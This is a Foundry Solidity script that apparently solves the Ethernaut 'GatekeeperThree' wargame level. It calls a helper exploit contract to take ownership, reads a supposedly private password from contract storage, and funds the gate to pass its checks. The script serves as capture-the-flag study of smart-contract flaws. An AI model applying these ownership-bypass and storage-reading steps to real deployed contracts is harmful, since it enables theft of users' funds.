// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "../lib/forge-std/src/console2.sol";

interface IGatekeeperThree {
    function owner() external view returns(address);
    function entrant() external view returns(address);
    function trick() external view returns(address);
    function allowEntrance() external view returns(bool);

    function construct0r() external;

    function createTrick() external;
    function getAllowance(uint256 _password) external;

    function enter() external;
}

interface IExp {
    function run1() external;
    function run2() external;
}

contract L28_1 is Script {
    IGatekeeperThree gate = IGatekeeperThree(0xbE5B62a1b69FA3e27fAa1047651eD153329420a3);
    IExp exp = IExp(0xD7F986D32c9CC40D9670cfB9d6c4b683Ae4A4487);

    function run() external {
        uint256 alice_key = vm.envUint("alice_key");

        // ##########
        vm.startBroadcast(alice_key);

        console2.log("[GatekeeperThree]");
        console2.log("self = ", address(gate));
        console2.log("owner = ", gate.owner());
        console2.log("");

        exp.run1();

        console2.log("[GatekeeperThree]");
        console2.log("self = ", address(gate));
        console2.log("owner = ", gate.owner());
        console2.log("");

        gate.createTrick();
        address trick = gate.trick();

        console2.log("[GatekeeperThree]");
        console2.log("self = ", address(gate));
        console2.log("owner = ", gate.owner());
        console2.log("trick = ", trick);
        console2.log("");
        
        // ##########
        vm.stopBroadcast();
    }

}

contract L28_2 is Script {
    IGatekeeperThree gate = IGatekeeperThree(0xbE5B62a1b69FA3e27fAa1047651eD153329420a3);
    IExp exp = IExp(0xD7F986D32c9CC40D9670cfB9d6c4b683Ae4A4487);

    error TransferFailed();

    function run() external {
        uint256 alice_key = vm.envUint("alice_key");
        // ##########
        vm.startBroadcast(alice_key);

        address trick = gate.trick();
    
        uint256 password = uint256(vm.load(trick, bytes32(uint256(0x2))));

        console2.log("[SimpleTrick]");
        console2.log("password = ", password);
        console2.log("allowEntrance = ", gate.allowEntrance());
        console2.log("");

        gate.getAllowance(password);

        console2.log("[SimpleTrick]");
        console2.log("password = ", password);
        console2.log("allowEntrance = ", gate.allowEntrance());
        console2.log("");

        uint256 balance = address(gate).balance;
        console2.log("[GatekeeperThree]");
        console2.log("balance = ", balance);
        console2.log("");

        (bool success, ) = payable(address(gate)).call{value: 0.0011 ether}("");

        if (!success) {
            revert TransferFailed();
        }

        balance = address(gate).balance;

        console2.log("[GatekeeperThree]");
        console2.log("balance = ", balance);
        console2.log("");

        exp.run2();

        console2.log("[GatekeeperThree]");
        console2.log("entrant = ", gate.entrant());

        // ##########
        vm.stopBroadcast();
    }
}
